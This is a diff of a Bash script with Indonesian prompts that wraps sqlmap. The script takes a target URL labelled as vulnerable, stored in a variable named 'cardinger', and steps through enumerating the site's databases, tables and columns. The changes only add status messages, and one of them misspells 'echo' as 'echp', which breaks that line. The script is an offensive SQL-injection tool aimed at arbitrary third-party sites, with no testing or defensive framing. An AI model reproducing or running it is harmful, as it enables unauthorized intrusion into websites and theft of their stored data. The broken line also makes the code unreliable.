@@ -47,7 +47,7 @@ clear
 read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
 clear
 ./sqlmap.py -u $cardinger --random-agent --dbs
-                echo ""
+                echo "Jika terlihat ada database silahkan pilih lanjut."
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
 select opt in "${options[@]}"
@@ -68,6 +68,7 @@ read -p "Ketikkan DATABASE Yang Akan Di Buka: " databs
 clear
 ./sqlmap.py -u $cardinger --random-agent -D $databs --tables
 echo ""
+echo "Jika terlihat ada table silahkan pilih lanjut."
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
 select opt in "${options[@]}"
@@ -87,6 +88,7 @@ read -p "Ketikkan Table Yang Akan Di Buka: " tabledd
 clear
 ./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd --columns
 echo ""
+echp "Jika terlihat ada columns silahkan lanjut."
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
 select opt in "${options[@]}"
